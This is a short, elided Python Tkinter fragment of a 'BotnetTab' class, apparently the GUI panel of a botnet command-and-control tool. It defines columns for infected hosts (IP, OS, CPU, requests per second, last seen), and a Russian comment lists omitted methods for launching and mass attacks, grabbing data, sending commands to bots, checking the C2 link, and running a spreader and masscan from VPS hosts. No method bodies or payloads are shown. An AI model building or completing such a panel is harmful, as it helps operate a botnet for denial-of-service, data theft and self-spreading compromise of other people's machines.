...
class BotnetTab(ttk.Frame):
    ...
    def create_widgets(self):
        ...
        columns = ("ip", "hostname", "os", "type", "country", "cpu", "ram", "status", "rps", "last_seen")
    ...
    # ... (все предыдущие методы полностью: _on_right_click, _ctx_attack, _ctx_grab, _ctx_stop, _ctx_exec, _ctx_copy_ip, _on_cmd_select, check_c2_connection, _auto_refresh, refresh_bots, check_all_bots, _fetch_bots, sort_by_column, _update_tree_safe, _send_raw, launch_attack, launch_grab, stop_selected, _send_custom_to_bots, send_custom_command, mass_attack, delete_offline_bots, _on_local_changed, _run_spreader_stream, start_spreader_vps, stop_spreader_vps, load_targets_file, start_builtin_masscan, update_vps)
